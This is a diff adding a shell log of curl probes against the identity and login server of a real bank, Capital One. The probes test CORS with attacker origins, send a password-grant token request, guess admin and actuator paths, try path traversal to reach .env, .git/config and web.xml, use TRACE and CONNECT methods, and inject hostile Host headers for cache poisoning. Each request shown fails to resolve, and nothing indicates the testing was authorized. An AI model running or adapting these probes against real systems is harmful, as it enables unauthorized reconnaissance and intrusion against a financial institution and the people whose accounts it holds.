@@ -1,0 +1,423 @@
+
+
+# Advanced CORS Testing
+# Sun Jun 22 10:23:40 PM EEST 2025
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: https://attacker.com' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: http://evil.org' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: null' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: https://capitalone.com.evil.net' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: https://attacker.com' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: http://evil.org' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: null' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: https://capitalone.com.evil.net' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: https://attacker.com' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: http://evil.org' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: null' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: https://capitalone.com.evil.net' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: https://attacker.com' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: http://evil.org' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: null' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X OPTIONS --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Origin: https://capitalone.com.evil.net' -H 'Access-Control-Request-Method: POST' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+
+# OpenID Configuration Testing
+# Sun Jun 22 10:23:41 PM EEST 2025
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration' | jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+
+# Token Endpoint Testing
+# Sun Jun 22 10:23:41 PM EEST 2025
+
+$ curl -X POST --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Content-Type: application/x-www-form-urlencoded' -d 'client_id=test&grant_type=password&username=test&password=test' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/token'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+
+# Admin Interface Testing
+# Sun Jun 22 10:23:41 PM EEST 2025
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/console'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/management'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/actuator'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/jmx-console'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+
+# Sensitive File Testing
+# Sun Jun 22 10:23:41 PM EEST 2025
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration/..//.env'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration/..//config.json'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration/..//.git/config'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration/..//WEB-INF/web.xml'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users/..//.env'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users/..//config.json'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users/..//.git/config'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users/..//WEB-INF/web.xml'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/account/..//.env'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/account/..//config.json'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/account/..//.git/config'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/account/..//WEB-INF/web.xml'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor/..//.env'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor/..//config.json'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor/..//.git/config'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor/..//WEB-INF/web.xml'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com
+
+
+# Dangerous Methods Testing
+# Sun Jun 22 10:23:42 PM EEST 2025
+
+$ curl -v -X TRACE --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X TRACK --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X DEBUG --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X CONNECT --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X TRACE --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X TRACK --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X DEBUG --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X CONNECT --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X TRACE --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X TRACK --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X DEBUG --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X CONNECT --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X TRACE --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X TRACK --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X DEBUG --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v -X CONNECT --connect-timeout 20 -A 'TargetedResearchBot/3.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+
+# Cache Poisoning Testing
+# Sun Jun 22 10:23:42 PM EEST 2025
+
+$ curl -v --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'X-Forwarded-Host: attacker.com' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Host: attacker.com' 'https://identity.capitalone.com/auth/realms/capitalone/.well-known/openid-configuration'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'X-Forwarded-Host: attacker.com' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Host: attacker.com' 'https://identity.capitalone.com/auth/admin/realms/capitalone/users'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'X-Forwarded-Host: attacker.com' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Host: attacker.com' 'https://identity.capitalone.com/auth/realms/capitalone/account'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'X-Forwarded-Host: attacker.com' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
+
+$ curl -v --connect-timeout 20 -A 'TargetedResearchBot/3.0' -H 'Host: attacker.com' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/saml/descriptor'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
+* Closing connection
+curl: (6) Could not resolve host: identity.capitalone.com
